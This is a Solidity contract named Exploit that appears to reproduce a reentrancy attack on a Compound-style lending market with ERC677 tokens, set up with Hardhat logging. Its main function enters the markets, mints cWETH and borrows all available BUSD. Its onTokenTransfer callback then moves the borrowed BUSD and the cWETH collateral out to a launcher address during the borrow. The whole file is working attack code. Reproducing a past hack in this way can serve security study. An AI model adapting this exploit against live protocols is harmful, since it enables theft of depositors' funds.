pragma solidity ^0.5.16;

import "./CErc20.sol";
import "./ERC677BridgeToken.sol";
import "./Launcher.sol";
import "./Comptroller.sol";

import "hardhat/console.sol";

contract Exploit {
	address public launcher; 
	ERC677BridgeToken public WETH;
	ERC677BridgeToken public BUSD;
	Comptroller public troll; 
	CErc20 public cWETH;
	CErc20 public cBUSD;

	constructor(
		address _launcher,
		ERC677BridgeToken _WETH,
		ERC677BridgeToken _BUSD,
		Comptroller _troll,
		CErc20 _cWETH,
		CErc20 _cBUSD
	) public {
		launcher = _launcher;
		WETH = _WETH;
		BUSD = _BUSD;
		troll = _troll;
		cWETH = _cWETH;
		cBUSD = _cBUSD;
	}

	function onTokenTransfer(address from, uint value, bytes calldata data) external {
        console.log("[Exploit]      BUSD: %s", BUSD.balanceOf(address(this))); 

		console.log("[Exploit] (3) Move out cWETH and borrowed BUSD");        
       	BUSD.transfer(launcher, BUSD.balanceOf(address(this)));	 
       	cWETH.transfer(launcher, cWETH.balanceOf(address(this)));	 
	}

	function main() public {
		console.log("[Exploit] (1) Enter cWETH and cBUSD markets");
		address[] memory _cTokens = new address[](2);
		_cTokens[0] = address(cWETH);
		_cTokens[1] = address(cBUSD);
		troll.enterMarkets(_cTokens);

		console.log("[Exploit] (2) mint cWETH");

		WETH.approve(address(cWETH), uint256(-1));
        cWETH.mint(WETH.balanceOf(address(this)));
        console.log("[Exploit]      cWETH: %s", cWETH.balanceOf(address(this))); 

        (uint _error, uint _liquidity, uint _shortfall) = troll.getAccountLiquidity(address(this));
        console.log("[Exploit]      Liquidity: %s", _liquidity);

		console.log("[Exploit] (3) borrow BUSD");
		uint _maxAmount = cBUSD.getCash();
		cBUSD.borrow(_maxAmount);
	}
}